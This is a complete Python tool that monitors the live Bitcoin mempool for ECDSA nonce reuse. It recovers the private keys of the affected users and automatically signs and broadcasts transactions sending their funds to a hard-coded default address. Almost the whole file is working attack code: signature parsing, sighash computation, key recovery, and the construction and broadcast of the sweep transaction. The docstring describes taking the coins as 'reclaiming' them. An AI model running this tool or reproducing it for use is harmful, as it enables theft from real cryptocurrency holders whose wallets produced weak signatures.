#!/usr/bin/env python3
"""Live Bitcoin mempool monitor that recovers ECDSA private keys when nonce reuse is detected.
This tool connects to a QuickNode (or any Bitcoin Core compatible) JSON-RPC
endpoint, watches the mempool in real time, and keeps track of every ECDSA
signature that appears in transaction inputs. When two signatures reuse the
same nonce (detectable via a shared ``r`` value) for the same public key, the
private key is recovered instantly using the classic nonce reuse equation and
the exposed funds are swept automatically to a controlled destination.
Only standard P2PKH, native P2WPKH, and P2SH-wrapped P2WPKH inputs are
supported. These cover the overwhelming majority of Bitcoin transactions and
are sufficient for detecting nonce reuse in practical scenarios while allowing
the sweeper to craft compatible replacement transactions.
"""
from __future__ import annotations
import argparse
import hashlib
import logging
import os
import struct
import time
from dataclasses import dataclass
from decimal import Decimal, ROUND_UP
from typing import Any, Dict, Iterable, List, Optional, Tuple
import requests
from ecdsa import SigningKey, curves, ellipticcurve, numbertheory
from ecdsa.util import sigencode_der_canonize

LOGGER = logging.getLogger("mempool_nonce_monitor")

# Constants for secp256k1
SECP256K1 = curves.SECP256k1
CURVE = SECP256K1.curve
GENERATOR = SECP256K1.generator
CURVE_ORDER = SECP256K1.order
FIELD_PRIME = CURVE.p()
SATOSHI = Decimal("100000000")
EIGHT_DECIMAL = Decimal("0.00000001")
SIGHASH_ALL = 0x01
DEFAULT_SWEEP_ADDRESS = "1EKjByhWLpzBAs1paYGS9pK6oYYgx77uvG"
BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
P2PKH_INPUT_VBYTES = 148
P2WPKH_INPUT_VBYTES = 110
P2PKH_OUTPUT_VBYTES = 34
TX_OVERHEAD_VBYTES = 10

@dataclass
class SignatureObservation:
    """Container for the data needed to recover a private key."""
    txid: str
    vin_index: int
    r: int
    s: int
    z: int
    pubkey_hex: str
    sighash_type: int
    prev_txid: str
    prev_vout: int
    amount_sat: int
    script_pubkey_hex: str
    is_witness: bool
    redeem_script_hex: Optional[str]

class JsonRpcError(RuntimeError):
    """Raised when the JSON-RPC endpoint returns an error."""

class BitcoinRpcClient:
    """Minimal JSON-RPC client for Bitcoin Core compatible nodes."""
    def __init__(self, url: str, user: Optional[str], password: Optional[str], timeout: int = 30) -> None:
        self.url = url
        self.timeout = timeout
        self.session = requests.Session()
        if user and password:
            self.session.auth = (user, password)
        self.session.headers.update({"Content-Type": "application/json"})
        self._request_id = 0

    def call_with_retry(self, method: str, params: Optional[Iterable[Any]] = None, max_retries: int = 3) -> Any:
        for attempt in range(max_retries):
            try:
                return self.call(method, params)
            except (ConnectionError, JsonRpcError) as exc:
                if attempt == max_retries - 1:
                    raise
                wait_time = (2 ** attempt) * 0.1  # Exponential backoff
                LOGGER.warning("RPC call failed, retrying in %.2f seconds...", wait_time)
                time.sleep(wait_time)
        raise RuntimeError("Max retries exceeded")

    def call(self, method: str, params: Optional[Iterable[Any]] = None) -> Any:
        self._request_id += 1
        payload = {
            "jsonrpc": "2.0",
            "id": self._request_id,
            "method": method,
            "params": list(params or []),
        }
        try:
            response = self.session.post(self.url, json=payload, timeout=self.timeout)
            response.raise_for_status()
        except requests.HTTPError as exc:
            if response.status_code == 429:  # Rate limited
                retry_after = int(response.headers.get("Retry-After", 5))
                LOGGER.warning("Rate limited. Retrying after %d seconds...", retry_after)
                time.sleep(retry_after)
                return self.call(method, params)
            raise ConnectionError(f"RPC request failed: {exc}") from exc
        except requests.RequestException as exc:
            raise ConnectionError(f"RPC request failed: {exc}") from exc
        data = response.json()
        if data.get("error"):
            raise JsonRpcError(f"RPC error calling {method}: {data['error']}")
        return data.get("result")

def sha256d(data: bytes) -> bytes:
    """Double SHA-256."""
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def ripemd160(data: bytes) -> bytes:
    h = hashlib.new("ripemd160")
    h.update(data)
    return h.digest()

def hash160(data: bytes) -> bytes:
    return ripemd160(hashlib.sha256(data).digest())

def int_to_little_endian(value: int, length: int) -> bytes:
    return value.to_bytes(length, "little")

def encode_varint(value: int) -> bytes:
    if value < 0xFD:
        return struct.pack("<B", value)
    if value <= 0xFFFF:
        return b"\xfd" + struct.pack("<H", value)
    if value <= 0xFFFFFFFF:
        return b"\xfe" + struct.pack("<I", value)
    return b"\xff" + struct.pack("<Q", value)

def encode_pushdata(data: bytes) -> bytes:
    length = len(data)
    if length < 0x4C:
        return bytes([length]) + data
    if length <= 0xFF:
        return b"\x4c" + bytes([length]) + data
    if length <= 0xFFFF:
        return b"\x4d" + struct.pack("<H", length) + data
    return b"\x4e" + struct.pack("<I", length) + data

def base58check_decode(value: str) -> bytes:
    num = 0
    for char in value:
        num *= 58
        if char not in BASE58_ALPHABET:
            raise ValueError(f"Invalid Base58 character: {char}")
        num += BASE58_ALPHABET.index(char)
    combined = num.to_bytes((num.bit_length() + 7) // 8, "big") if num else b""
    leading_zero_bytes = b"\x00" * (len(value) - len(value.lstrip("1")))
    payload = leading_zero_bytes + combined
    if len(payload) < 5:
        raise ValueError("Invalid Base58Check payload length")
    checksum = payload[-4:]
    data = payload[:-4]
    if sha256d(data)[:4] != checksum:
        raise ValueError("Invalid Base58Check checksum")
    return data

def p2pkh_scriptpubkey(address: str) -> str:
    payload = base58check_decode(address)
    if payload[0] != 0x00 or len(payload) != 21:
        raise ValueError("Only mainnet P2PKH addresses are supported for sweeping")
    pubkey_hash = payload[1:]
    script = b"\x76\xa9\x14" + pubkey_hash + b"\x88\xac"
    return script.hex()

def parse_der_signature(signature: bytes) -> Tuple[int, int]:
    """Parse a DER-encoded ECDSA signature (without sighash byte)."""
    if len(signature) < 8 or signature[0] != 0x30:
        raise ValueError("Invalid DER signature format")
    length = signature[1]
    if length + 2 != len(signature):
        raise ValueError("Invalid DER signature length")
    r_offset = 2
    if signature[r_offset] != 0x02:
        raise ValueError("Invalid DER integer marker for r")
    r_length = signature[r_offset + 1]
    r_start = r_offset + 2
    r_end = r_start + r_length
    r = int.from_bytes(signature[r_start:r_end], "big")
    s_offset = r_end
    if signature[s_offset] != 0x02:
        raise ValueError("Invalid DER integer marker for s")
    s_length = signature[s_offset + 1]
    s_start = s_offset + 2
    s_end = s_start + s_length
    s = int.from_bytes(signature[s_start:s_end], "big")
    return r, s

def parse_pushdata(script_hex: str) -> List[bytes]:
    """Return the pushed elements from a scriptSig."""
    data = bytes.fromhex(script_hex)
    elements: List[bytes] = []
    i = 0
    while i < len(data):
        opcode = data[i]
        i += 1
        if opcode == 0:
            elements.append(b"")
            continue
        if opcode <= 75:
            push_len = opcode
        elif opcode == 76:  # OP_PUSHDATA1
            push_len = data[i]
            i += 1
        elif opcode == 77:  # OP_PUSHDATA2
            push_len = struct.unpack("<H", data[i : i + 2])[0]
            i += 2
        elif opcode == 78:  # OP_PUSHDATA4
            push_len = struct.unpack("<I", data[i : i + 4])[0]
            i += 4
        else:
            # Ignore non-push opcodes
            continue
        elements.append(data[i : i + push_len])
        i += push_len
    return elements

def build_p2wpkh_script_code(pubkey_hex: str) -> bytes:
    pubkey_bytes = bytes.fromhex(pubkey_hex)
    key_hash = hash160(pubkey_bytes)
    return b"\x19\x76\xa9\x14" + key_hash + b"\x88\xac"

def decimal_satoshi(value: Any) -> int:
    return int((Decimal(str(value)) * SATOSHI).to_integral_value())

def legacy_sighash(tx: Dict[str, Any], input_index: int, script_bytes: bytes, sighash_type: int) -> int:
    version = struct.pack("<I", tx.get("version", 1))
    serialized_inputs = [encode_varint(len(tx["vin"]))]
    for idx, vin in enumerate(tx["vin"]):
        prev_txid = bytes.fromhex(vin["txid"])[::-1]
        prev_vout = struct.pack("<I", vin["vout"])
        if idx == input_index:
            script = script_bytes
        else:
            script = b""
        script_length = encode_varint(len(script))
        sequence = struct.pack("<I", vin.get("sequence", 0xFFFFFFFF))
        serialized_inputs.append(prev_txid + prev_vout + script_length + script + sequence)
    serialized_outputs = [encode_varint(len(tx["vout"]))]
    for vout in tx["vout"]:
        amount_sat = decimal_satoshi(vout.get("value", 0))
        amount = struct.pack("<Q", amount_sat)
        script = bytes.fromhex(vout["scriptPubKey"]["hex"])
        serialized_outputs.append(amount + encode_varint(len(script)) + script)
    locktime = struct.pack("<I", tx.get("locktime", 0))
    hash_type = struct.pack("<I", sighash_type)
    preimage = (
        version
        + b"".join(serialized_inputs)
        + b"".join(serialized_outputs)
        + locktime
        + hash_type
    )
    digest = sha256d(preimage)
    return int.from_bytes(digest, "big")

def bip143_sighash(
    tx: Dict[str, Any],
    input_index: int,
    script_code: bytes,
    amount_sat: int,
    sighash_type: int,
) -> int:
    version = struct.pack("<I", tx.get("version", 1))
    # hashPrevouts
    prevouts = b"".join(
        bytes.fromhex(vin["txid"])[::-1] + struct.pack("<I", vin["vout"]) for vin in tx["vin"]
    )
    hash_prevouts = sha256d(prevouts) if prevouts else b"\x00" * 32
    # hashSequence
    sequences = b"".join(struct.pack("<I", vin.get("sequence", 0xFFFFFFFF)) for vin in tx["vin"])
    hash_sequence = sha256d(sequences) if sequences else b"\x00" * 32
    # hashOutputs
    outputs = b"".join(
        struct.pack("<Q", decimal_satoshi(vout.get("value", 0)))
        + encode_varint(len(bytes.fromhex(vout["scriptPubKey"]["hex"])))
        + bytes.fromhex(vout["scriptPubKey"]["hex"])
        for vout in tx["vout"]
    )
    hash_outputs = sha256d(outputs) if outputs else b"\x00" * 32
    vin = tx["vin"][input_index]
    outpoint = bytes.fromhex(vin["txid"])[::-1] + struct.pack("<I", vin["vout"])
    script_code_serialized = encode_varint(len(script_code)) + script_code
    amount = struct.pack("<Q", amount_sat)
    sequence = struct.pack("<I", vin.get("sequence", 0xFFFFFFFF))
    locktime = struct.pack("<I", tx.get("locktime", 0))
    hash_type = struct.pack("<I", sighash_type)
    preimage = (
        version
        + hash_prevouts
        + hash_sequence
        + outpoint
        + script_code_serialized
        + amount
        + sequence
        + hash_outputs
        + locktime
        + hash_type
    )
    digest = sha256d(preimage)
    return int.from_bytes(digest, "big")

def decompress_pubkey(pubkey_hex: str) -> ellipticcurve.Point:
    pubkey = bytes.fromhex(pubkey_hex)
    prefix = pubkey[0]
    if prefix == 0x04 and len(pubkey) == 65:
        x = int.from_bytes(pubkey[1:33], "big")
        y = int.from_bytes(pubkey[33:], "big")
        return ellipticcurve.Point(CURVE, x, y)
    if prefix in (0x02, 0x03) and len(pubkey) == 33:
        x = int.from_bytes(pubkey[1:], "big")
        alpha = (pow(x, 3, FIELD_PRIME) + 7) % FIELD_PRIME
        beta = pow(alpha, (FIELD_PRIME + 1) // 4, FIELD_PRIME)
        if (beta % 2 == 0) != (prefix == 0x02):
            beta = (-beta) % FIELD_PRIME
        return ellipticcurve.Point(CURVE, x, beta)
    raise ValueError("Unsupported public key format")

def estimate_vbytes(inputs: List[SignatureObservation]) -> int:
    total = TX_OVERHEAD_VBYTES + P2PKH_OUTPUT_VBYTES
    for obs in inputs:
        if obs.is_witness:
            total += P2WPKH_INPUT_VBYTES
        else:
            total += P2PKH_INPUT_VBYTES
    return total

def serialize_transaction(tx: Dict[str, Any]) -> bytes:
    version = struct.pack("<I", tx.get("version", 2))
    vin = tx.get("vin", [])
    vout = tx.get("vout", [])
    has_witness = any(vin_entry.get("txinwitness") for vin_entry in vin)
    result = bytearray()
    result += version
    if has_witness:
        result += b"\x00\x01"
    result += encode_varint(len(vin))
    for vin_entry in vin:
        result += bytes.fromhex(vin_entry["txid"])[::-1]
        result += struct.pack("<I", vin_entry["vout"])
        script_sig_hex = vin_entry.get("scriptSig", {}).get("hex", "")
        script_sig = bytes.fromhex(script_sig_hex)
        result += encode_varint(len(script_sig))
        result += script_sig
        result += struct.pack("<I", vin_entry.get("sequence", 0xFFFFFFFF))
    result += encode_varint(len(vout))
    for vout_entry in vout:
        if "value" in vout_entry:
            amount_sat = decimal_satoshi(vout_entry["value"])
        else:
            amount_sat = vout_entry.get("value_satoshi", 0)
        result += struct.pack("<Q", amount_sat)
        script_hex = vout_entry["scriptPubKey"]["hex"]
        script = bytes.fromhex(script_hex)
        result += encode_varint(len(script))
        result += script
    if has_witness:
        for vin_entry in vin:
            witness_stack = vin_entry.get("txinwitness", [])
            result += encode_varint(len(witness_stack))
            for item in witness_stack:
                data = bytes.fromhex(item)
                result += encode_varint(len(data))
                result += data
    result += struct.pack("<I", tx.get("locktime", 0))
    return bytes(result)

class MempoolNonceMonitor:
    def __init__(
        self,
        rpc_client: BitcoinRpcClient,
        poll_interval: float = 15.0,
        once: bool = False,
        sweep_address: Optional[str] = DEFAULT_SWEEP_ADDRESS,
        sweep_fee_rate: float = 12.0,
        sweep_min_fee: int = 500,
    ) -> None:
        self.rpc = rpc_client
        self.poll_interval = poll_interval
        self.once = once
        self.seen: Dict[Tuple[int, str], SignatureObservation] = {}
        self.processed_txids: set[str] = set()
        self.prev_tx_cache: Dict[str, Dict[str, Any]] = {}
        self.recovered: List[Tuple[SignatureObservation, SignatureObservation, int, int]] = []
        self.sweep_fee_rate = Decimal(str(sweep_fee_rate))
        self.sweep_min_fee = int(sweep_min_fee)
        self.swept_pubkeys: set[str] = set()
        self.sweep_address = sweep_address or DEFAULT_SWEEP_ADDRESS
        try:
            self.sweep_script_hex = p2pkh_scriptpubkey(self.sweep_address)
        except ValueError as exc:
            LOGGER.error("Invalid sweep destination %s: %s", self.sweep_address, exc)
            self.sweep_script_hex = None

    def run(self) -> None:
        LOGGER.info("Starting mempool monitor (poll interval: %.1fs)", self.poll_interval)
        try:
            while True:
                self.scan_mempool()
                if self.once:
                    break
                time.sleep(self.poll_interval)
        except KeyboardInterrupt:
            LOGGER.info("Shutdown requested by user")

    def scan_mempool(self) -> None:
        try:
            tx_entries = self.rpc.call_with_retry("getrawmempool", [True])
        except Exception as exc:
            LOGGER.warning("Failed to fetch mempool: %s", exc)
            return
        LOGGER.debug("Mempool size: %d", len(tx_entries))
        new_txids = [txid for txid in tx_entries if txid not in self.processed_txids]
        if not new_txids:
            LOGGER.debug("No new transactions detected in mempool")
            return
        LOGGER.info("Processing %d new transactions", len(new_txids))
        batch_size = 10  # Process 10 transactions at a time
        for i in range(0, len(new_txids), batch_size):
            batch = new_txids[i:i + batch_size]
            for txid in batch:
                try:
                    tx = self.rpc.call_with_retry("getrawtransaction", [txid, True])
                except Exception as exc:
                    LOGGER.warning("Failed to fetch transaction %s: %s", txid, exc)
                    continue
                self.process_transaction(txid, tx)
                self.processed_txids.add(txid)
            time.sleep(1)  # Delay between batches to avoid rate limiting

    def process_transaction(self, txid: str, tx: Dict[str, Any]) -> None:
        for idx, vin in enumerate(tx.get("vin", [])):
            if "coinbase" in vin:
                continue
            try:
                observation = self.extract_signature(tx, txid, vin, idx)
            except Exception as exc:
                LOGGER.debug("Skipping input %s:%d due to parsing error: %s", txid, idx, exc)
                continue
            if observation is None:
                continue
            key = (observation.r, observation.pubkey_hex)
            if key in self.seen:
                previous = self.seen[key]
                private_key, nonce = self.recover_private_key(previous, observation)
                if private_key is not None:
                    LOGGER.warning(
                        "Nonce reuse detected! txid %s (vin %d) and txid %s (vin %d)",
                        previous.txid,
                        previous.vin_index,
                        observation.txid,
                        observation.vin_index,
                    )
                    LOGGER.warning("Recovered private key: %s", hex(private_key))
                    LOGGER.warning("Recovered nonce: %s", hex(nonce))
                    self.recovered.append((previous, observation, private_key, nonce))
                    self.sweep_recovered_key(private_key, [previous, observation])
                else:
                    LOGGER.debug("Duplicate r encountered but recovery failed due to singular equation")
            else:
                self.seen[key] = observation

    def recover_private_key(
        self, first: SignatureObservation, second: SignatureObservation
    ) -> Tuple[Optional[int], Optional[int]]:
        if first.s == second.s:
            return None, None
        numerator = (first.z - second.z) % CURVE_ORDER
        denominator = (first.s - second.s) % CURVE_ORDER
        try:
            denom_inv = numbertheory.inverse_mod(denominator, CURVE_ORDER)
        except ZeroDivisionError:
            return None, None
        nonce = (numerator * denom_inv) % CURVE_ORDER
        try:
            r_inv = numbertheory.inverse_mod(first.r, CURVE_ORDER)
        except ZeroDivisionError:
            return None, None
        private_key = ((first.s * nonce - first.z) * r_inv) % CURVE_ORDER
        try:
            pub_point = decompress_pubkey(first.pubkey_hex)
        except Exception:
            return private_key, nonce
        expected_point = private_key * GENERATOR
        if expected_point != pub_point:
            LOGGER.warning("Recovered key does not match observed public key")
        return private_key, nonce

    def sweep_recovered_key(self, private_key: int, observations: List[SignatureObservation]) -> None:
        if self.sweep_script_hex is None:
            LOGGER.debug("Skipping sweep because sweep destination is invalid")
            return
        if not observations:
            return
        pubkey_hex = observations[0].pubkey_hex
        if pubkey_hex in self.swept_pubkeys:
            LOGGER.debug("Sweep already attempted for pubkey %s", pubkey_hex)
            return
        unique_inputs: Dict[Tuple[str, int], SignatureObservation] = {}
        for candidate in self.seen.values():
            if candidate.pubkey_hex == pubkey_hex:
                unique_inputs[(candidate.prev_txid, candidate.prev_vout)] = candidate
        for obs in observations:
            unique_inputs[(obs.prev_txid, obs.prev_vout)] = obs
        inputs = [obs for obs in unique_inputs.values() if obs.amount_sat > 0]
        if not inputs:
            LOGGER.debug("No sweepable inputs found for pubkey %s", pubkey_hex)
            return
        total_in = sum(obs.amount_sat for obs in inputs)
        estimated_vb = estimate_vbytes(inputs)
        fee_decimal = (self.sweep_fee_rate * Decimal(estimated_vb)).quantize(Decimal("1"), rounding=ROUND_UP)
        fee = max(self.sweep_min_fee, int(fee_decimal))
        if total_in <= fee:
            LOGGER.warning(
                "Skipping sweep for pubkey %s because fee %d sat exceeds total input %d sat",
                pubkey_hex,
                fee,
                total_in,
            )
            self.swept_pubkeys.add(pubkey_hex)
            return
        amount_out = total_in - fee
        value_btc = (Decimal(amount_out) / SATOSHI).quantize(EIGHT_DECIMAL)
        tx: Dict[str, Any] = {
            "version": 2,
            "vin": [],
            "vout": [
                {
                    "value": str(value_btc),
                    "scriptPubKey": {"hex": self.sweep_script_hex},
                }
            ],
            "locktime": 0,
        }
        for obs in inputs:
            script_sig_hex = obs.redeem_script_hex or ""
            tx["vin"].append(
                {
                    "txid": obs.prev_txid,
                    "vout": obs.prev_vout,
                    "scriptSig": {"hex": script_sig_hex},
                    "sequence": 0xFFFFFFFD,
                    "txinwitness": [],
                }
            )
        try:
            self._sign_sweep_transaction(tx, inputs, private_key)
        except Exception as exc:
            LOGGER.error("Failed to sign sweep transaction: %s", exc)
            self.swept_pubkeys.add(pubkey_hex)
            return
        raw_tx = serialize_transaction(tx).hex()
        LOGGER.info(
            "Broadcasting sweep transaction reclaiming %d sat (fee %d sat) to %s",
            amount_out,
            fee,
            self.sweep_address,
        )
        try:
            sweep_txid = self.rpc.call("sendrawtransaction", [raw_tx])
            LOGGER.warning("Sweep transaction broadcast successfully: %s", sweep_txid)
        except Exception as exc:
            LOGGER.error("Failed to broadcast sweep transaction: %s", exc)
        finally:
            self.swept_pubkeys.add(pubkey_hex)

    def _sign_sweep_transaction(
        self, tx: Dict[str, Any], inputs: List[SignatureObservation], private_key: int
    ) -> None:
        signing_key = SigningKey.from_secret_exponent(private_key, curve=SECP256K1)
        for index, obs in enumerate(inputs):
            sighash_type = SIGHASH_ALL
            if obs.is_witness:
                script_code = build_p2wpkh_script_code(obs.pubkey_hex)
                sighash = bip143_sighash(tx, index, script_code, obs.amount_sat, sighash_type)
            else:
                script_bytes = bytes.fromhex(obs.script_pubkey_hex)
                sighash = legacy_sighash(tx, index, script_bytes, sighash_type)
            digest = sighash.to_bytes(32, "big")
            signature = signing_key.sign_digest(digest, sigencode=sigencode_der_canonize)
            signature_with_type = signature + bytes([sighash_type])
            if obs.is_witness:
                witness_stack = [signature_with_type.hex(), obs.pubkey_hex]
                tx["vin"][index]["txinwitness"] = witness_stack
                if obs.redeem_script_hex:
                    tx["vin"][index]["scriptSig"]["hex"] = obs.redeem_script_hex
                else:
                    tx["vin"][index]["scriptSig"]["hex"] = ""
            else:
                script_sig = encode_pushdata(signature_with_type) + encode_pushdata(bytes.fromhex(obs.pubkey_hex))
                tx["vin"][index]["scriptSig"]["hex"] = script_sig.hex()

    def extract_signature(
        self, tx: Dict[str, Any], txid: str, vin: Dict[str, Any], index: int
    ) -> Optional[SignatureObservation]:
        prev_txid = vin["txid"]
        prev_vout_index = vin["vout"]
        prev_tx = self.fetch_previous_tx(prev_txid)
        prev_outputs = prev_tx.get("vout", [])
        if prev_vout_index >= len(prev_outputs):
            raise ValueError("Referenced output index out of range")
        prev_output = prev_outputs[prev_vout_index]
        script_pubkey = prev_output["scriptPubKey"]
        script_pubkey_hex = script_pubkey.get("hex")
        if not script_pubkey_hex:
            raise ValueError("Missing scriptPubKey hex")
        amount_sat = decimal_satoshi(prev_output.get("value", 0))
        is_witness = bool(vin.get("txinwitness"))
        signature_hex: Optional[str] = None
        pubkey_hex: Optional[str] = None
        if is_witness:
            witness = vin["txinwitness"]
            if len(witness) < 2:
                return None
            signature_hex = witness[0]
            pubkey_hex = witness[-1]
            script_code = build_p2wpkh_script_code(pubkey_hex)
            sighash_type = int(signature_hex[-2:], 16)
            der = bytes.fromhex(signature_hex[:-2])
            r, s = parse_der_signature(der)
            z = bip143_sighash(tx, index, script_code, amount_sat, sighash_type)
            redeem_script_hex = vin.get("scriptSig", {}).get("hex") or None
        else:
            script_sig = vin.get("scriptSig", {})
            script_hex = script_sig.get("hex")
            if not script_hex:
                return None
            pushes = parse_pushdata(script_hex)
            if len(pushes) < 2:
                return None
            signature_hex = pushes[0].hex()
            pubkey_hex = pushes[1].hex()
            sighash_type = int(signature_hex[-2:], 16)
            der = bytes.fromhex(signature_hex[:-2])
            r, s = parse_der_signature(der)
            script_bytes = bytes.fromhex(script_pubkey_hex)
            z = legacy_sighash(tx, index, script_bytes, sighash_type)
            redeem_script_hex = None
        observation = SignatureObservation(
            txid=txid,
            vin_index=index,
            r=r,
            s=s,
            z=z,
            pubkey_hex=pubkey_hex,
            sighash_type=sighash_type,
            prev_txid=prev_txid,
            prev_vout=prev_vout_index,
            amount_sat=amount_sat,
            script_pubkey_hex=script_pubkey_hex,
            is_witness=is_witness,
            redeem_script_hex=redeem_script_hex,
        )
        LOGGER.debug(
            "Observed signature: txid=%s vin=%d r=%s s=%s", txid, index, hex(r), hex(s)
        )
        return observation

    def fetch_previous_tx(self, txid: str) -> Dict[str, Any]:
        if txid not in self.prev_tx_cache:
            self.prev_tx_cache[txid] = self.rpc.call("getrawtransaction", [txid, True])
        return self.prev_tx_cache[txid]

def configure_logging(verbose: bool) -> None:
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format="%(asctime)s | %(levelname)s | %(message)s")

def _env_or_none(name: str) -> Optional[str]:
    value = os.getenv(name)
    return value if value else None

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Live monitor for ECDSA nonce reuse in the Bitcoin mempool")
    parser.add_argument(
        "--rpc-url",
        default=os.getenv("QUICKNODE_BTC_RPC_URL")
        or os.getenv("BITCOIN_RPC_URL")
        or "https://example.quiknode.pro/YOUR_TOKEN/",
        help="Bitcoin JSON-RPC URL (defaults to QUICKNODE_BTC_RPC_URL env or a placeholder QuickNode endpoint)",
    )
    parser.add_argument(
        "--rpc-user",
        default=_env_or_none("BITCOIN_RPC_USER"),
        help="RPC username for Basic auth (QuickNode endpoints do not require this)",
    )
    parser.add_argument(
        "--rpc-password",
        default=_env_or_none("BITCOIN_RPC_PASSWORD"),
        help="RPC password for Basic auth (QuickNode endpoints do not require this)",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=float(os.getenv("MEMPOOL_POLL_INTERVAL", 15.0)),
        help="Polling interval in seconds (default: %(default)s)",
    )
    parser.add_argument(
        "--once",
        action="store_true",
        help="Scan the mempool only once and exit",
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable debug logging",
    )
    parser.add_argument(
        "--sweep-address",
        default=os.getenv("SWEEP_ADDRESS", DEFAULT_SWEEP_ADDRESS),
        help="Destination P2PKH address for automatic sweeps (default: %(default)s)",
    )
    parser.add_argument(
        "--sweep-fee-rate",
        type=float,
        default=float(os.getenv("SWEEP_FEE_RATE", 15.0)),
        help="Fee rate in sat/vbyte for sweep transactions (default: %(default)s)",
    )
    parser.add_argument(
        "--sweep-min-fee",
        type=int,
        default=int(os.getenv("SWEEP_MIN_FEE", 500)),
        help="Minimum fee in satoshis for sweep transactions (default: %(default)s)",
    )
    return parser.parse_args()

def main() -> None:
    args = parse_args()
    configure_logging(args.verbose)
    rpc = BitcoinRpcClient(args.rpc_url, args.rpc_user, args.rpc_password)
    monitor = MempoolNonceMonitor(
        rpc,
        poll_interval=args.interval,
        once=args.once,
        sweep_address=args.sweep_address,
        sweep_fee_rate=args.sweep_fee_rate,
        sweep_min_fee=args.sweep_min_fee,
    )
    monitor.run()

if __name__ == "__main__":
    main()
